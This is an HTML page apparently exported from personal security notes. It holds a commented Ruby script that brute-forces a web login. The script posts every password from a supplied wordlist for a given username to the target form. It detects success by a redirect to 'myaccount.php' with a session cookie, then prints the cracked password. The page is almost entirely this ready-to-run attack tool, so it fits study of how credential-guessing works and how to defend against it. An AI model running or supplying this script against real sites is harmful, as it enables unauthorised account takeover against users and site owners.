<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Script: Bruteforce login</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Script: Bruteforce login</h1><br/><br /><br /><br /><div class="codebox"><pre>require <span style="color:#3ad900;font-weight:400">&#39;net/http&#39;</span><br /><br /><span style="color:#0088ff;font-weight:400">#parameters provided by the user</span><br />Target = ARGV[0]<br />User = ARGV[1]<br />Password_file = ARGV[2]<br /><br />url = URI<span style="color:#ff9d00;font-weight:700">(</span>Target<span style="color:#ff9d00;font-weight:700">)</span><br />params = <span style="color:#ff9d00;font-weight:700">{</span><span style="color:#3ad900;font-weight:400">&quot;user&quot;</span>=&gt;User<span style="color:#ff9d00;font-weight:700">}</span><br /><span style="color:#0088ff;font-weight:400">#Net::HTTP.start opens the TCP stream connection.</span><br /><span style="color:#0088ff;font-weight:400"># It create a unique TCP session to perform different requests with the target server</span><br />http = Net<span style="color:#ff9d00;font-weight:700">::</span>HTTP.start<span style="color:#ff9d00;font-weight:700">(</span>url.hostname<span style="color:#ff9d00;font-weight:700">)</span><br />req = Net<span style="color:#ff9d00;font-weight:700">::</span>HTTP<span style="color:#ff9d00;font-weight:700">::</span>Post.new<span style="color:#ff9d00;font-weight:700">(</span>url.request_uri<span style="color:#ff9d00;font-weight:700">)</span><br /><br /><span style="color:#0088ff;font-weight:400">#test passwords in the file &quot;Password_file = ARGV[2]&quot; with an unique user &quot;User = ARGV[1]&quot;</span><br />File.open<span style="color:#ff9d00;font-weight:700">(</span>Password_file,<span style="color:#3ad900;font-weight:400">&#39;r&#39;</span><span style="color:#ff9d00;font-weight:700">)</span> <span style="color:#ff9d00;font-weight:700">do</span> <span style="color:#ff9d00;font-weight:700">|file|</span>	<br />	real_pwd = file.each <span style="color:#ff9d00;font-weight:700">do</span>	<span style="color:#ff9d00;font-weight:700">|pwd|</span><br />		params[<span style="color:#3ad900;font-weight:400">&#39;pass&#39;</span>]=pwd.chop<br />		req.set_form_data<span style="color:#ff9d00;font-weight:700">(</span>params<span style="color:#ff9d00;font-weight:700">)</span><br />		res = http.request<span style="color:#ff9d00;font-weight:700">(</span>req<span style="color:#ff9d00;font-weight:700">)</span><br />		<span style="color:#0088ff;font-weight:400">#when the right password is found, the script stops reading from the Password_file and</span><br />		<span style="color:#ff9d00;font-weight:700">break</span> <span style="color:#ff9d00;font-weight:700">pwd</span> <span style="color:#ff9d00;font-weight:700">if</span> <span style="color:#ff9d00;font-weight:700">(</span>res[<span style="color:#3ad900;font-weight:400">&#39;location&#39;</span>]==<span style="color:#3ad900;font-weight:400">&#39;myaccount.php&#39;</span> <span style="color:#ff9d00;font-weight:700">&amp;&amp;</span> res[<span style="color:#3ad900;font-weight:400">&#39;set-cookie&#39;</span>]<span style="color:#ff9d00;font-weight:700">)</span><br />	end<br />	<span style="color:#0088ff;font-weight:400"># the password is printed to stdout.</span><br />	puts <span style="color:#3ad900;font-weight:400">&quot;\nPassword for &#39;&quot;</span>+User+<span style="color:#3ad900;font-weight:400">&quot;&#39; is: &quot;</span>+real_pwd <span style="color:#ff9d00;font-weight:700">if</span> real_pwd.is_a?String<br />end<br /><br />http.finish<br /></pre></div></div>
</body>
</html>
